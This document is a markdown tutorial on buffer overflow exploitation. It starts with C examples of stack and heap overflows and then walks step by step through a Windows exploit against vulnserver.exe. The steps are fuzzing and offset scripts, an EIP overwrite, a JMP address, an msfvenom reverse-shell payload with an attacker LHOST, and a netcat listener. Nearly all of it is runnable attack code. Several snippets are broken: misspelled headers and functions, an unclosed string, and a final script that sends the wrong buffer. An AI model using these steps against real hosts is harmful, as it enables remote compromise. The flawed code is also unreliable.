## Buffer Overflow Exploitation

#### Type Buffer Overflow
* Stack-Based Buffer Overflow
* EBP (Extended Base Pointer)
* ESP (Extended Stack Pointer)
* EIP (Extended Instruction Pointer)
* ESI (Extended Source Index)
* EDI (Extended Destination Index)

## Simple Buffer Overflow in C Programming
### A. Stack Buffer Overflow
##### Save File : stack_bufferoverflow.c
```
#include<studio.h>
#include<stdlib.h>
#include<string.h>
int buffer(char str[]) {
	char buff[12];
	strcpy(buff, str);
	return 1;
}
int main(int argc, char **argy) {
	buffer("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");
	printf("After buffer overflow\n");
	return 1;
}
```
##### Compile
```
gcc stack_bufferoverflow.c
```

##### Testing
```
./a.out
```

### B. Heap Buffer Overflow
##### Save File : heap_bufferflow.c
```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(int argc, char **argv){
	char *in = malloc(18);
	char *out = malloc(18);
	strcpy(out, "Sample Output");
	strcpy(in, argv[1]);
	printif("Input at %p: %s\n",in,in);
	printif("Output at %p: %s\n,out,out);
	printif("\n\n%s\n",out);
}
```

##### Compile
```
gcc heap_overflow.c
```

##### Testing
```
./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Windows Buffer Overflow Exploitation
* Perform Spiking
* Perform Fuzzing
* Identify Offset
* Overwrite EIP Register
* Identify Bad Characters
* Generate Shellcode
* Gain Root Access

### A. Perform Spiking
#### 1. STAT 
##### Upload vulnserver.exe (to Victim)
##### Establish a connection vulnserver using netcat (from Attacker)
```
nc -nv 172.23.74.125 9999
```
##### STATS templates and perform spiking. Save file : stats.spk
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```
##### Testing (from Attacker)
```
generic send tcp 10.13.3.55 9999 stats.spk 0 0 
```

#### 2. TRUN
##### Upload vulnserver.exe (to Victim)
##### Establish a connection vulnserver using netcat (from Attacker)
```
nc -nv 172.23.74.125 9999
```
##### TRUN templates and perform spiking. Save file : trun.spk
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
##### Testing (from Attacker)
```
generic send tcp 172.23.74.125 9999 trun.spk 0 0 
```

### B. Perform Fuzzing

##### Open File vulnserver.exe from ImunnityDebugger and Run (to Victim)

##### Create File : fuzz.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket
from time import sleep

buff = "A" * 100

while True:
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect(('172.23.74.125', 9999))
		soc.send(('TRUN /.:/' + buff))
		soc.close()
		sleep(1)
		buff = buff + "A" * 100
	except:
		print "Fuzzing Crashed Vuln Server at %s bytes" % str(len(buff))
		sys.exit()
```

##### Testing (from Attacker)
```
./fuzz.py
```

##### Verification (from Attacker)

### C. Identify Offset
##### Create Pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900 > create_pattern.txt
```

##### Create File : find_offset.py
```
#!/usr/bin/python2
import sys, socket

offset = "paste here pattern"

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + offset))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
./find_offset.py
```

##### Verification and Copy EIP (from Victim)

##### Extract EIP (from Attacker)
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 > extract_EIP
```

### D. Overwrite EIP Register

##### Create File : overwrite.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

shellcode = "C" * 2003 + "D" * 4

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
./overwrite.py
```

##### Verification and Copy EIP (from Victim)

### E. Identify Bad Characters

##### Install Badchars
##### Create File : badchars.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

badchars = "paste here badchars"

shellcode = "C" * 2003 + "D" * 4 + badchars

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
./badchars.py
```

##### Verification and Copy ESP (from Victim)

### F. Identify Module (JUMP)
#####

##### Create File : jump.py
```
#!/usr/bin/python2
import sys, socket

shellcode = "C" * 2003 + "xaf\x11\x50\x62"

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

### G. Generate Shellcode
##### Generate Shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.3.55 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" > shellcode.txt
```

### H. Gain Root Access
##### Create File : shellcode.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

overflow = "paste here shellcode"
shellcode = "C" * 2003 + "xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + overflow))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
./shellcode.py
```

##### Running Netcat (from Attacker)
```
nc -nvlp 4444
```

## Bug

#### Support
